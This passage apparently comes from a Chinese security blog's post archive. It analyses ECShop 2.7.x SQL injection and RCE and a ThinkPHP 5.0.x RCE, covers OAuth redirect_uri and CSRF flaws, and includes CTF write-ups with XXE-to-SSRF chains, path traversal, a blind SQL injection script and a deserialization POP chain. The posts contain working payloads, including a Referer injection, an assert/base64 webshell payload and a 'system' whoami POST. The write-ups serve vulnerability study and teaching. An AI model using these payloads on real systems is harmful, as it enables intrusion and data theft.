漏洞思路就是redict_uri限制不到位，严重的情况是没有限制域，一般情况是redict_uri可以到子域。QQ做了限制，拿cline_id和redirec_uri比对，不相符就返回False，如下 案例-第三方帐号快捷登录授权劫持漏洞修改redirect_uri到子域(一般是论坛站点，可以加载外域图片的地方，或者是可以XSS的地方)。location跳转到子域后访问我们外域地址，referer就携带了code。 相关链接KEY：https://gh0st.cn/archives/2018-02-12/1 无state导致CSRF产生的账户接管用户在第三方网站A上登录后，通过Authorization code方式的绑定流程。 案例拿绑定QQ为例子。 一般在登陆后的个人中心页面有绑定社交用户的功能，依然是请求greph.qq.com获取code，拼接到redirect_uri访问后完成绑定。如果没有state参数，用户在A登陆后进行，点击攻击者的redict_uri+code链接，就把用户A绑定在了攻击者的QQ上。可以看作是CSRF 相关链接OAuth2.0忽略state参数引发的CSRF漏洞：https://blog.csdn.net/gjb724332682/article/details/54428808 Oauth配置错误导致的账户接管：https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg"},{"title":"Echsop2.7.x几处漏洞分析","date":"2019-02-01T16:00:00.000Z","path":"2019/02/02/Echsop2.7.x几处漏洞分析/","text":"Echsop2.7.x几处漏洞分析前言这些洞是在半年前公布的细节，当时没来得及关注。最近在给自己定目标，决定重新刷一遍这些洞。 SQL注入由于未对Reffer内容进行过滤而造成的SQL注入 漏洞位置user.php:302 elseif ($action == &#39;login&#39;) { if (empty($back_act)) { if (empty($back_act) &amp;&amp; isset($GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;])) { $back_act = strpos($GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;], &#39;user.php&#39;) ? &#39;./index.php&#39; : $GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;]; } else { $back_act = &#39;user.php&#39;; } } $smarty-&gt;assign(&#39;back_act&#39;, $back_act); $smarty-&gt;display(&#39;user_passport.dwt&#39;); }$back_act可控为Reffer值，跟进assign /** * 注册变量 * * @access public * @param mix $tpl_var * @param mix $value * * @return void */ function assign($tpl_var, $value = &#39;&#39;) { if (is_array($tpl_var)) { foreach ($tpl_var AS $key =&gt; $val) { if ($key != &#39;&#39;) { $this-&gt;_var[$key] = $val; } } } else { if ($tpl_var != &#39;&#39;) { $this-&gt;_var[$tpl_var] = $value; } } }assign()注册了模板变量$this-&gt;_var[‘back_act’]，这里注册的变量在后面的页面模板编译中会用到 继续跟进user的display函数 /** * 显示页面函数 * * @access public * @param string $filename * @param sting $cache_id * * @return void */ function display($filename, $cache_id = &#39;&#39;) { error_reporting(E_ALL ^ E_NOTICE); $out = $this-&gt;fetch($filename, $cache_id); if (strpos($out, $this-&gt;_echash) !== false) { $k = explode($this-&gt;_echash, $out); foreach ($k AS $key =&gt; $val) { if (($key % 2) == 1) { $k[$key] = $this-&gt;insert_mod($val); } } $out = implode(&#39;&#39;, $k); } echo $out; }Display中调用fetch函数处理模板文件：user_passport.dwt，跟进关键代码 /** * 处理模板文件 * * @access public * @param string $filename * @param sting $cache_id * * @return sring */ function fetch($filename, $cache_id = &#39;&#39;) { ... $out = $this-&gt;make_compiled($filename); ... return $out; // 返回html数据 }$filename就是user_passport.dwt，关键内容如下 &lt;tr&gt; &lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;act_login&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;back_act&quot; value=&quot;{$back_act}&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;{$lang.confirm_login}&quot; /&gt;&lt;/td&gt; &lt;/tr&gt;通过make_compiled函数编译模板文件，编译时会把之前注册的模板变量渲染到{$back_act}。$out即为渲染后的html代码块 继续跟进流程，回到display。$out内容被分割为两部分，分割依据是$this-&gt;_echash，而$this-&gt;_echash参数值固定 $k = explode($this-&gt;_echash, $out); foreach ($k AS $key =&gt; $val) { if (($key % 2) == 1) { $k[$key] = $this-&gt;insert_mod($val); } }跟进insert_mod function insert_mod($name) // 处理动态内容 { list($fun, $para) = explode(&#39;|&#39;, $name); $para = unserialize($para); $fun = &#39;insert_&#39; . $fun; return $fun($para); }继续对$out内容以“|”形式分割成$fun、$para，|后的内容进行反序列化，再动态调用$fun函数。至此，函数名$fun可控，函数内容$para可控，找一个以Insert_开头的可利用的函数 function insert_ads($arr) { static $static_res = NULL; $time = gmtime(); if (!empty($arr[&#39;num&#39;]) &amp;&amp; $arr[&#39;num&#39;] != 1) { $sql = &#39;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &#39; . &#39;p.ad_height, p.position_style, RAND() AS rnd &#39; . &#39;FROM &#39; . $GLOBALS[&#39;ecs&#39;]-&gt;table(&#39;ad&#39;) . &#39; AS a &#39;. &#39;LEFT JOIN &#39; . $GLOBALS[&#39;ecs&#39;]-&gt;table(&#39;ad_position&#39;) . &#39; AS p ON a.position_id = p.position_id &#39; . &quot;WHERE enabled = 1 AND start_time &lt;= &#39;&quot; . $time . &quot;&#39; AND end_time &gt;= &#39;&quot; . $time . &quot;&#39; &quot;. &quot;AND a.position_id = &#39;&quot; . $arr[&#39;id&#39;] . &quot;&#39; &quot; . &#39;ORDER BY rnd LIMIT &#39; . $arr[&#39;num&#39;]; $res = $GLOBALS[&#39;db&#39;]-&gt;GetAll($sql); }触发SQL注入，构造的PAYLOAD形式： echash+ads|serialize(array(&quot;num&quot;=&gt;sqlpayload,&quot;id&quot;=&gt;1))创宇提供的一个payload示例如下： Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}采用limit注入，利用procedure analyse函数。具体见P师傅文章：https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html RCE分析RCE利用点还是insert_ads函数，参数的处理流程很大一部分是上文SQL注入的流程，这里分析3.x版本的RCE 继续跟进ads函数，重点部分代码如下： function insert_ads($arr) { foreach ($res AS $row) { if ($row[&#39;position_id&#39;] != $arr[&#39;id&#39;]) { continue; } $position_style = $row[&#39;position_style&#39;]; ... } $position_style = &#39;str:&#39; . $position_style; $GLOBALS[&#39;smarty&#39;]-&gt;assign(&#39;ads&#39;, $ads); $val = $GLOBALS[&#39;smarty&#39;]-&gt;fetch($position_style); }$res为查询结果，即$row[‘position_id’]可用SQL注入的Union select控制，$arr[‘id’]也可控，当两者相等时$position_style的值就可控为$row[‘position_style’]。接着又调用assgin注册变量、fetch编译模板。再看fetch函数 /** * 处理模板文件 * * @access public * @param string $filename * @param sting $cache_id * * @return sring */ function fetch($filename, $cache_id = &#39;&#39;) { if (strncmp($filename,&#39;str:&#39;, 4) == 0) { $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4))); } else { ......由于字符串前被拼接了str:，所以进入$this-&gt;_eval函数处理，这也是最终的漏洞触发点，可以eval我们构造的恶意语句。 但是再_eval之前经过fetch_str处理字符串，跟进 /** * 处理字符串函数 * * @access public * @param string $source * * @return sring */ function fetch_str($source) { if (!defined(&#39;ECS_ADMIN&#39;)) { $source = $this-&gt;smarty_prefilter_preCompile($source); } $source=preg_replace(&quot;/([^a-zA-Z0-9_]{1,1})+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\\()/is&quot;, &quot;&quot;, $source); if(preg_match_all(&#39;~(&lt;\\?(?:\\w+|=)?|\\?&gt;|language\\s*=\\s*[\\&quot;\\&#39;]?php[\\&quot;\\&#39;]?)~is&#39;, $source, $sp_match)) { $sp_match[1] = array_unique($sp_match[1]); for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++) { $source = str_replace($sp_match[1][$curr_sp],&#39;%%%SMARTYSP&#39;.$curr_sp.&#39;%%%&#39;,$source); } for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++) { $source= str_replace(&#39;%%%SMARTYSP&#39;.$curr_sp.&#39;%%%&#39;, &#39;&lt;?php echo \\&#39;&#39;.str_replace(&quot;&#39;&quot;, &quot;\\&#39;&quot;, $sp_match[1][$curr_sp]).&#39;\\&#39;; ?&gt;&#39;.&quot;\\n&quot;, $source); } } return preg_replace(&quot;/{([^\\}\\{\\n]*)}/e&quot;, &quot;\\$this-&gt;select(&#39;\\\\1&#39;);&quot;, $source); }第一个正则会匹配危险的字符串函数，重点在最后一个正则。\\\\1是替代表达，匹配到的字符串会替代\\\\1的位置。 eg:return preg_replace(&quot;/{([^\\}\\{\\n]*)}/e&quot;, &quot;\\$this-&gt;select(&#39;\\\\1&#39;);&quot;, &quot;xxx{abc}xxx&quot;);结果就是return $this-&gt;select(&#39;{abc}&#39;) 跟进select函数 /** * 处理{}标签 * * @access public * @param string $tag * * @return sring */ function select($tag) { $tag = stripslashes(trim($tag)); if (empty($tag)) { return &#39;{}&#39;; } elseif ($tag{0} == &#39;*&#39; &amp;&amp; substr($tag, -1) == &#39;*&#39;) // 注释部分 { return &#39;&#39;; } elseif ($tag{0} == &#39;$&#39;) // 变量 { // if(strpos($tag,&quot;&#39;&quot;) || strpos($tag,&quot;]&quot;)) // { // return &#39;&#39;; // } return &#39;&lt;?php echo &#39; . $this-&gt;get_val(substr($tag, 1)) . &#39;; ?&gt;&#39;; } ......trim处理了字符串两边的{}，最后返回一段php标签下的字符串，如果成功返回，则之前的eval就可以执行这段php字符串。不过这个值的获取取决于get_val，跟进get_val /** * 处理smarty标签中的变量标签 * * @access public * @param string $val * * @return bool */ function get_val($val) { if (strrpos($val, &#39;[&#39;) !== false) { $val = preg_replace(&quot;/\\[([^\\[\\]]*)\\]/eis&quot;, &quot;&#39;.&#39;.str_replace(&#39;$&#39;,&#39;\\$&#39;,&#39;\\\\1&#39;)&quot;, $val); } if (strrpos($val, &#39;|&#39;) !== false) { $moddb = explode(&#39;|&#39;, $val); $val = array_shift($moddb); } if (empty($val)) { return &#39;&#39;; } if (strpos($val, &#39;.$&#39;) !== false) { $all = explode(&#39;.$&#39;, $val); foreach ($all AS $key =&gt; $val) { $all[$key] = $key == 0 ? $this-&gt;make_var($val) : &#39;[&#39;. $this-&gt;make_var($val) . &#39;]&#39;; } $p = implode(&#39;&#39;, $all); } else { $p = $this-&gt;make_var($val); }若$val不存在.$则进入make_var() /** * 处理去掉$的字符串 * * @access public * @param string $val * * @return bool */ function make_var($val) { if (strrpos($val, &#39;.&#39;) === false) { if (isset($this-&gt;_var[$val]) &amp;&amp; isset($this-&gt;_patchstack[$val])) { $val = $this-&gt;_patchstack[$val]; } $p = &#39;$this-&gt;_var[\\&#39;&#39; . $val . &#39;\\&#39;]&#39;; } else { .....这个make_var的$val可控，则表明返回的$p可控，最终返回的$this-&gt;get_val()就可控，也就是$this-&gt;_eval的实参可控（一段PHP标签下的字符串），从而getshell。 构造Payload我用逆推的思路，逐步满足每个函数判断的条件 最终的POC要结合SQL注入，通过id和num参数将order by注释 再利用union select构造指定列的值：第二列postion_id，第七列position_style Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&#39; /*&quot;;}554fcae493e564ee0dc75bdf2ebf94caid的值就是&#39; /*，num的值*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -，0x27202f2a是&#39; /*的16进制值，也就是第二列$row[&#39;position_id&#39;]的值。0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d为{$&#39;];phpinfo/**/();//}的16进制值 漏洞修复看到ecshop4/ecshop/includes/lib_insert.php 对id和num进行强制类型转换了，字符串无法利用 题外话创宇WAF拦截的Payload是这样 {$abc&#39;];assert(base64_decode(&#39;YXNzZXJ0KCRfR0VUWyd4J10pOw==&#39;));//}巧妙解决了$_GET[]的[]问题，测试用法 参考链接https://paper.seebug.org/695/#_5"},{"title":"FireShellCTF2019 Bad Injections解题记录","date":"2019-01-29T16:00:00.000Z","path":"2019/01/30/FireShellCTF2019 Bad Injections解题记录/","text":"FireShellCTF2019 Bad Injections解题记录原文投稿安全客：https://www.anquanke.com/post/id/170381 题目名称：Bad Injections 题目地址：http://68.183.31.62:94 貌似现在还没有关环境，这是整场比赛最简单的Web题…Web题质量很高，表哥们可以趁环境在去爽一下 主页面有四个功能，纯静态页面。右键about页面源码信息： 给个本地web目录 接着在list页面的源码里发现信息： 因为页面显示图片，url没有其他参数，猜测应该是readfile之类的函数读的文件。File+hash的方法，既然是ctf，那hash应该不会加key。下载一个文件试一下能不能成功 68.183.31.62:94/download?file=files/../../../../../etc/passwd&amp;hash=ab56ade6fe16a65bce82a7cd833f13cc这里让hash = md5(file)，成功下载到了/etc/passwd 尝试去读/flag发现文件不存在，去读.bash_history也不存在..捷径失败… 看到之前list下载的test.txt内容是这样的 down一下download的源码，顺便fuzz一下Controllers的文件 68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&amp;hash=f350edcfda52eb0127c4410633efd260字典只跑出来了个admin.php 看了源码感觉存在一个XXE或者是create_function的代码注入，因为找不到/flag所以利用XXE没什么卵用，应该就是代码注入点，但是要加载外部文本来引入正确xml文本才能进入函数判断。 尝试请求admin?url=xxx&amp;order=xx死活获取不到页面，应该是路由没找对。在这卡了一会，请教腹黑师傅，才想起来去读入口文件。 68.183.31.62:94/download?file=files/../../app/Index.php&amp;hash=1dfd7acd700544ea7d26b8368935c4e8/app/index.php &lt;?php ini_set(&#39;display_errors&#39;,1); ini_set(&#39;display_startup_erros&#39;,1); error_reporting(E_ALL); require_once(&#39;Routes.php&#39;); function __autoload($class_name){ if(file_exists(&#39;./classes/&#39;.$class_name.&#39;.php&#39;)){ require_once &#39;./classes/&#39;.$class_name.&#39;.php&#39;; }else if(file_exists(&#39;./Controllers/&#39;.$class_name.&#39;.php&#39;)){ require_once &#39;./Controllers/&#39;.$class_name.&#39;.php&#39;; } }再去读路由/app/Routes.php，看看是个什么狗屁规则 &lt;?php Route::set(&#39;index.php&#39;,function(){ Index::createView(&#39;Index&#39;); }); Route::set(&#39;index&#39;,function(){ Index::createView(&#39;Index&#39;); }); Route::set(&#39;about-us&#39;,function(){ AboutUs::createView(&#39;AboutUs&#39;); }); Route::set(&#39;contact-us&#39;,function(){ ContactUs::createView(&#39;ContactUs&#39;); }); Route::set(&#39;list&#39;,function(){ ContactUs::createView(&#39;Lista&#39;); }); Route::set(&#39;verify&#39;,function(){ if(!isset($_GET[&#39;file&#39;]) &amp;&amp; !isset($_GET[&#39;hash&#39;])){ Verify::createView(&#39;Verify&#39;); }else{ Verify::verifyFile($_GET[&#39;file&#39;],$_GET[&#39;hash&#39;]); //设置session，file和hash对应请求文件 } }); Route::set(&#39;download&#39;,function(){ if(isset($_REQUEST[&#39;file&#39;]) &amp;&amp; isset($_REQUEST[&#39;hash&#39;])){ echo Download::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]); }else{ echo &#39;jdas&#39;; } }); Route::set(&#39;verify/download&#39;,function(){ Verify::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]); }); Route::set(&#39;custom&#39;,function(){ $handler = fopen(&#39;php://input&#39;,&#39;r&#39;); $data = stream_get_contents($handler); // xml if(strlen($data) &gt; 1){ Custom::Test($data); }else{ Custom::createView(&#39;Custom&#39;); } }); Route::set(&#39;admin&#39;,function(){ if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){ Admin::createView(&#39;Admin&#39;); }else{ if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){ Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]); }else{ echo &quot;;(&quot;; } } }); Route::set(&#39;custom/sort&#39;,function(){ Custom::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]); }); Route::set(&#39;index&#39;,function(){ Index::createView(&#39;Index&#39;); });原来我只下载了download和admin页面，还有其它功能页面没下载到，看到了玄学的admin规则如下，原来只有本地才能请求到sort函数 Route::set(&#39;admin&#39;,function(){ if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){ Admin::createView(&#39;Admin&#39;); }else{ if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){ Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]); }else{ echo &quot;;(&quot;; } } });找一下其他利用，再看Custom Route::set(&#39;custom&#39;,function(){ $handler = fopen(&#39;php://input&#39;,&#39;r&#39;); $data = stream_get_contents($handler); if(strlen($data) &gt; 1){ Custom::Test($data); }else{ Custom::createView(&#39;Custom&#39;); } });Custom::Test class Custom extends Controller{ public static function Test($string){ $root = simplexml_load_string($string,&#39;SimpleXMLElement&#39;,LIBXML_NOENT); $test = $root-&gt;name; echo $test; } }$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用 联想到刚才admin页面只有本地才能请求，那就用Custom的XXE当跳板好了，测试一下是否能当跳板 poc: &lt;?xml version=&#39;1.0&#39;?&gt; &lt;!DOCTYPE name [&lt;!ENTITY file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&amp;order=1&quot;&gt;]&gt; &lt;note&gt; &lt;name&gt;&amp;file;&lt;/name&gt; &lt;/note&gt;admin页面确实file_get_contents到了我vps的xxe文本。 尝试去构造正确的xml文本到执行到usort函数进行注入，warning不影响代码执行 http://vps/xxe.txt &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;root&gt; &lt;channel&gt; &lt;item&gt; &lt;link&gt;@hpdoger.me&lt;/link&gt; &lt;/item&gt; &lt;item&gt; &lt;link&gt;@souhu.com&lt;/link&gt; &lt;/item&gt; &lt;/channel&gt; &lt;/root&gt;POC &lt;?xml version=&#39;1.0&#39;?&gt; &lt;!DOCTYPE name [&lt;!ENTITY file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&amp;order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F&quot;&gt;]&gt; &lt;note&gt; &lt;name&gt;&amp;file;&lt;/name&gt; &lt;/note&gt;"},{"title":"安恒杯月赛19新年场WriteUp","date":"2019-01-25T16:00:00.000Z","path":"2019/01/26/安恒杯月赛19新年场WriteUp/","text":"安恒杯月赛19新年场WriteUpWebWEB1题目代码 &lt;?php @error_reporting(1); include &#39;flag.php&#39;; class baby { protected $skyobj; public $aaa; public $bbb; function __construct() { $this-&gt;skyobj = new sec; } function __toString() { if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); } } class cool { public $filename; public $nice; public $amzing; function read() { $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) { $file = &quot;./{$this-&gt;filename}&quot;; if (file_get_contents($file)) { return file_get_contents($file); } else { return &quot;you must be joking!&quot;; } } } } class sec { function read() { return &quot;it&#39;s so sec~~&quot;; } } if (isset($_GET[&#39;data&#39;])) { $Input_data = unserialize($_GET[&#39;data&#39;]); echo $Input_data; } else { highlight_file(&quot;./index.php&quot;); } ?&gt;考点考点一：echo可以调用toString()函数用来返回flag.php内容 考点二：让$this-&gt;nice是一个非baby的类，就能绕过$str 考点三：unserialize()不会执行construct，外部不可控protected变量skyobj，但是序列化时可以放到construct内部控制 EXPclass baby { protected $skyobj; function __construct() { $this-&gt;skyobj = new cool; $this-&gt;skyobj-&gt;amzing = serialize(new sec); $this-&gt;skyobj-&gt;filename = &quot;flag.php&quot;; } } class sec { function read(){} } class cool { public $filename; public $nice; public $amzing; } $test = new baby(); echo urlencode(serialize($test));WEB2约束攻击登陆admin 登陆后盲注 EXP #!/usr/bin/env python # encoding: utf-8 import requests import time def login(payload): url = &quot;http://106.12.21.77/Admin/User/Index?search[table]=flag/**/where/**/1/**/and/**/%s&quot; % (payload) # print &quot;[+] %s&quot; % (url) before_time = time.time() cookies = {&#39;PHPSESSID&#39;: &#39;3kus5jrhoqav8te0kf74hglii7&#39;} response = requests.get(url, cookies=cookies) # content = response.content after_time = time.time() offset = after_time - before_time # print &quot;[*] Offset : %f&quot; % (offset) if offset &gt; 2.5: return True else: return False def main(): data = &quot;&quot; charaters = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot; for i in range(1, 40, 1): for j in charaters: payload = &quot;if((mid((select/**/flag/**/from/**/flag),%d,1))=&#39;%s&#39;,sleep(3),0)%%23&quot; % (i, j) if login(payload): data += str(j) print &quot;[+] Found : %s&quot; % (data) break if __name__ == &quot;__main__&quot;: main()MISC隐写binwalk -e zhu.jpgStegsolve MISC2内存取证volatility一把梭 volatility imageinfo -f memory #分析操作系统 volatility hashdump -f memory --profile=WinXPSP2x86 #查看当前操作系统中的 password hash 得到管理员hash如下： Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b:::所以c22b315c040ae6e0efee3518d830362b即为管理员密码的md5值，解出来是123456789，再md5一下就行。 相关链接内存取证工具 volatility 使用说明：https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/ CRYPTO键盘密码ypau -&gt; flag"},{"title":"ThinkPHP5.0.0~5.0.23RCE漏洞分析","date":"2019-01-19T16:00:00.000Z","path":"2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/","text":"ThinkPHP5.0.0~5.0.23RCE漏洞分析最近TP5一直在爆洞，既然浪潮在，就有必要跟进分析一下。但是由于自己对TP5框架流程不是很了解，所以有了这篇边摸索边分析的文章。 TP5框架流程应用启动在App.php的run()函数，说一下自己对这个框架的大致理解 用户请求 -&gt; 路由解析 -&gt; 调度请求 -&gt; 执行操作 -&gt; 响应输出 App.php代码部分流程如下： (自己的理解，可能有不对的地方，望斧正1、应用初始化initModule()2、run()-&gt;routeCheck()对用户的get请求进行路由检测3、若注册了路由则返回相应的调度值，若路由检测无效(即没有注册路由)则返回调度值为module4、根据调度值，处理不同请求 switch (self::$dispatch[&#39;type&#39;]) { case &#39;redirect&#39;: header(&#39;Location: &#39; . self::$dispatch[&#39;url&#39;], true, self::$dispatch[&#39;status&#39;]); break; case &#39;module&#39;: $data = self::module(self::$dispatch[&#39;module&#39;], $config); break; case &#39;controller&#39;: $data = Loader::action(self::$dispatch[&#39;controller&#39;], self::$dispatch[&#39;params&#39;]); break; case &#39;method&#39;: $data = self::invokeMethod(self::$dispatch[&#39;method&#39;], self::$dispatch[&#39;params&#39;]); break; case &#39;function&#39;: $data = self::invokeFunction(self::$dispatch[&#39;function&#39;], self::$dispatch[&#39;params&#39;]); break; default: throw new Exception(&#39;dispatch type not support&#39;, 10008); }5、执行处理，返回输出。 TP5中get的路由请求参数为s。若get请求时s参数不存在，则调度类型默认值为module，调度方法实现self::module()，即进入MVC的处理方式：Controller层调用Module处理数据返回给View到用户。 所以核心操作就是调度请求。 回到正题这个漏洞的产生是因为对_method参数过滤不严导致$filter变量覆盖 POChttp://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha POST: _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami分析App.php部分代码： &lt;?php /** * 执行应用程序 * @access public * @param Request $request 请求对象 * @return Response * @throws Exception */ public static function run(Request $request = null) { $request = is_null($request) ? Request::instance() : $request; try { ... // 获取应用调度信息 $dispatch = self::$dispatch; // 未设置调度信息则进行 URL 路由检测 if (empty($dispatch)) { $dispatch = self::routeCheck($request, $config); } ... $data = self::exec($dispatch, $config); } catch (HttpResponseException $exception) { ... } ... }看到$dispatch = self::routeCheck($request, $config)，$request是http请求对象，通过调用Request类中的method方法来获取当前的http请求类型，该函数的实现在thinkphp/library/think/Request.php:512 &lt;?php /** * 当前的请求类型 * @access public * @param bool $method true 获取原始请求类型 * @return string */ public function method($method = false) { if (true === $method) { // 获取原始请求类型 return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;; } elseif (!$this-&gt;method) { if (isset($_POST[Config::get(&#39;var_method&#39;)])) { $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]); $this-&gt;{$this-&gt;method}($_POST); } elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) { $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]); } else { $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;; } } return $this-&gt;method; }var_method的伪装变量值为_method 因此通过POST一个_method参数，即可进入判断，并执行$this-&gt;{$this-&gt;method}($_POST)语句。因此通过指定_method即可完成对该类的任意方法的调用，其传入对应的参数即对应的$_POST数组。在poc里看到传入的method为construct，代码如下 &lt;?php protected function __construct($options = []) { foreach ($options as $name =&gt; $item) { if (property_exists($this, $name)) { $this-&gt;$name = $item; } } if (is_null($this-&gt;filter)) { $this-&gt;filter = Config::get(&#39;default_filter&#39;); } // 保存 php://input $this-&gt;input = file_get_contents(&#39;php://input&#39;); }利用foreach循环，和POST传入数组即可对Request对象的成员属性进行覆盖。经过覆盖后的结果 这里也就解释了poc中为什么要传入method=get。为了使$this-&gt;method=get才能对应上面Request.php的method()方法返回值，否则程序报错 request对象差不多清楚了，跟进self::routeCheck() &lt;?php /** * URL路由检测（根据PATH_INFO) * @access public * @param \\think\\Request $request 请求实例 * @param array $config 配置信息 * @return array * @throws \\think\\Exception */ public static function routeCheck($request, array $config) { $path = $request-&gt;path(); //path=captcha $depr = $config[&#39;pathinfo_depr&#39;]; $result = false; // 路由检测（根据路由定义返回不同的URL调度） $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]); return $result;根据$request的get请求进行路由检测，在vendor/topthink/think-captcha/src/helper.php中captcha注册了路由，因此其对应的URL调度值为method 再返回App.php继续执行$data = self::exec($dispatch, $config); &lt;?php protected static function exec($dispatch, $config) { switch ($dispatch[&#39;type&#39;]) { ... case &#39;method&#39;: // 回调方法 $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]); $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars); break; ... } return $data; }介绍的，根据调度值的不同处理不同请求，此时我们的dispatch为method。继续跟进Request::instance()-&gt;param() &lt;?php public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;) { if (empty($this-&gt;mergeParam)) { $method = $this-&gt;method(true); ... } ... // 当前请求参数和URL地址中的参数合并 $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); $this-&gt;mergeParam = true; ... return $this-&gt;input($this-&gt;param, $name, $default, $filter); }array_merge用来合并参数，此时$this-&gt;param为一个数组，且第一个值为我们刚才覆盖的get值 继续跟进$this-&gt;input($this-&gt;param, $name, $default, $filter) &lt;?php public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;) { ... // 解析过滤器 $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter); reset($data); } ... }跟进getFilter protected function getFilter($filter, $default) { if (is_null($filter)) { $filter = []; } else { $filter = $filter ?: $this-&gt;filter; if (is_string($filter) &amp;&amp; false === strpos($filter, &#39;/&#39;)) { $filter = explode(&#39;,&#39;, $filter); } else { $filter = (array) $filter; } } $filter[] = $default; return $filter; }到这逻辑就很清楚了，在input函数里面获得$filter值为我们之前覆盖的$this-&gt;filter，$data是实参传入的$this-&gt;param数组，接着调用 array_walk_recursive()进行自定义函数处理，函数名为filterValue() 从而调用call_user_func进行RCE 官方补丁看一下diff 触发漏洞点就是method可控，进而调用任意函数。补丁对参数method进行了白名单 参考链接 https://xz.aliyun.com/t/3845#toc-1 https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003 https://www.kancloud.cn/zmwtp/tp5/119426 https://www.kancloud.cn/zmwtp/tp5/119428"},{"title":"Code-breaking-medium之lumenserial","date":"2019-01-08T16:00:00.000Z","path":"2019/01/09/Code-breaking-medium֮lumenserial/","text":"Code-breaking-medium之lumenserial一道pop链很深的题，复现了一天，到目前已经有九个人做了。太菜了，只能照着柠檬和kk师傅的wp来学习思路。通过这次的复现，感受到耐心对审计的importance。记录一下在学习wp过程中得到的他见与己见。 题目地址：https://code-breaking.com/puzzle/7/ 前期一个ueditor的页面 在App\\Http\\Controllers的EditorController.php里提供了远程下载功能 private function download($url) { $content = file_get_contents($url);url可控为以GET形式传入的source值，由于禁止了以下函数，所以只能利用Phar反序列化再打通pop链 system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_logSearching POP chain因为phar反序列化不会反序列化类中的具体函数，所以要找两个魔法方法入口：__destruct|__wakeup这点在柠檬师傅的博客园看到的，也算是经验之谈了。 首先在namespace Illuminate\\Broadcasting里找到PendingBroadcast类存在destruct class PendingBroadcast { public 